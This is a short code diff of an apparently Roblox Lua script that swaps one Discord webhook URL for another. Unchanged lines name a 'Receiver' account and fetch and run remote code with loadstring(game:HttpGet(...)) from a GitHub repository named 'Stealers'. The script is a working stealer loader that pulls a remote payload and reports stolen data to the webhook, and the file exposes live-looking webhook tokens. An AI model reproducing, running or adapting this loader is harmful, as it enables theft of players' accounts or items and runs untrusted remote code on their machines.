@@ -1,4 +1,4 @@
 Receiver = "JelloBloxxer"
-Webhook = "https://discord.com/api/webhooks/1320157071949172807/ABZgatXZQbUW5OpHDXHuc05FE6LQewt5-_dcGRrZEpYs6_Qu5eSrFjzMpTA6fICeQ4qw"
+Webhook = "https://discord.com/api/webhooks/1320514522691272795/upYs6C7tyet1z347CCbRiRD9tLDU9KYn8l50MmRRAoQ0dbPECXtm9Dg9Cj-OY7G2ye97"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjq/Stealers/main/losg.lua"))()
